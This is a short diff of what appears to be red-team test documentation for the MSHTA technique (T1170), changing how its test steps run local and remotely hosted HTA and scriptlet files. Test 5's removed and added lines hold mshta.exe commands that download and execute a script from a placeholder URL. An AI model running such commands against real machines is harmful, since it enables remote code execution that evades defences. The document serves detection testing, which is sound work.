@@ -49,11 +49,11 @@ $ ENV:SPEGOPASS='password'
 
 ### Test 4 - Client Side - Locally executed .HTA Script
 1. On the target machine download the [T1170.hta](./payloads/T1170.hta) to a local folder.
-2. Execute "mshta.exe {full_path}/T1170.hta"
+2. Execute ```mshta.exe {full_path}/T1170.hta``` note: FULL path is required. NO relative paths will work
 
 ### Test 5 - Script Download - Remote Hosted .HTA Script
 1. On a web server reachable by the target, host [script.sct](./payloads/script.sct) for MSHTA to download and execute.
-2. Execute "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();" replacing {file_url} with the URL of the hosted script.
+2. Execute ```mshta.exe {file_url}``` replacing {file_url} with the URL of the hosted script.
 
 ### Test 6 - Client Side - Locally executed .PS1 Script
 
